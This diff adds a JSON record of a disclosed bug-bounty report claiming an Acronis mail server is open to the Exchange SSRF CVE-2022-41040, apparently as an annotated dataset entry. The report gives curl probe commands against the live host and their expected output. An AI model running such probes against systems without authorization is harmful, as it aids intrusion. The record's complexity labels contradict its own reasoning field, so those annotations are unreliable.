@@ -1,0 +1,38 @@
+{
+  "reported_to": "Acronis",
+  "reported_by": "bbece5b1ea2cbb33d0690ad ",
+  "title": " mail.acronis.com is vulnerable to zero day vulnerability CVE-2022-41040",
+  "content": "\nHello Acronis team,\nPlease run\ncurl -ksL -m5 -o /dev/null -I -w \"%{http_code}\" \"https://mail.acronis.com/autodiscover/autodiscover.json?Email=autodiscover/autodiscover.json@outlook.com&Protocol=ActiveSync\"\ncurl -ksL -m5 \"https://mail.acronis.com/autodiscover/autodiscover.json?Email=autodiscover/autodiscover.json@outlook.com&Protocol=ActiveSync\" | grep Protocol\nand get following output\n404 and {\"Protocol\":\"ActiveSync\",\"Url\":\"https://eas.outlook.com/Microsoft-Server-ActiveSync\"}\nProving that mail.acronis.com is vulnerable to CVE-2022-41040\nPoc video attached\nImpact\nSSRF can be used to for unauthorized actions or access to confidential data.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": 1000,
+  "weaknesses": [
+    "Server-Side Request Forgery (SSRF)"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1665695520,
+  "report_url": "https://hackerone.com/reports/1719719",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Run the following curl command to check the HTTP status code: curl -ksL -m5 -o /dev/null -I -w \"%{http_code}\" \"https://mail.acronis.com/autodiscover/autodiscover.json?Email=autodiscover/autodiscover.json@outlook.com&Protocol=ActiveSync\""
+    ],
+    [
+      2,
+      "Run the following curl command to check the response content: curl -ksL -m5 \"https://mail.acronis.com/autodiscover/autodiscover.json?Email=autodiscover/autodiscover.json@outlook.com&Protocol=ActiveSync\" | grep Protocol"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Server-Side Request Forgery (SSRF) in mail.acronis.com, identified by the CVE-2022-41040. The attack exploits the autodiscover feature of the mail server, allowing an attacker to make unauthorized requests to internal or external systems, potentially leading to unauthorized actions or access to confidential data.",
+  "reason": "The vulnerability involves a straightforward exploitation of a known vulnerability (CVE-2022-41040) using standard curl commands. The attack does not require multiple components, complex state manipulation, or novel logic. The interaction is direct and the steps to reproduce are simple and well-documented for this specific CVE.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
